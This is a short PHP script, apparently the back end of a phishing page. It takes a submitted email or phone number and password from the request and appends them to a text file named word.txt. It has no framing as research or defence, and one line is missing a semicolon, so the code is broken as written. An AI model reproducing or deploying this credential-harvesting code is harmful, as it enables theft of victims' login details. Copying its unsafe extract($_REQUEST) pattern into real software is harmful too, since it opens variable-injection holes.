<?php
   extract($_REQUEST);
   $file=fopen("word.txt","a");
    

   fwrite($file,"Email address or phone number :");
   fwrite($file, $Email ."\n");
   fwrite($file,"password :")
   fwrite($file, $password ."\n");
   fclose($file);
   
   ?>
